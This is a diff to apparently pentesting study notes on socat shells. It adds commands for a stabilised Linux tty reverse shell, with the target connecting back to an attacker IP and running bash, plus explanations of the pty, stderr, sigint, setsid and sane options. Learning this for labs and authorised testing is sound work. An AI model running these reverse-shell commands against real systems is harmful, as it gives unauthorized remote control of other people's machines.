@@ -58,9 +58,20 @@ Note that if the shell dies, any input in your own terminal will not be visible 
 `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`: On a Windows target  
 `socat TCP:<TARGET-IP>:<TARGET-PORT> -`:  On an attacking machine  
 
+*a fully stable Linux tty reverse shell*
+```
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+```
+```
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+<details>
 
-
-
-
+- pty, allocates a pseudoterminal on the target -- part of the stabilisation process
+- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
+- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
+- setsid, creates the process in a new session
+- sane, stabilises the terminal, attempting to "normalise" it.
+</details>
 
 
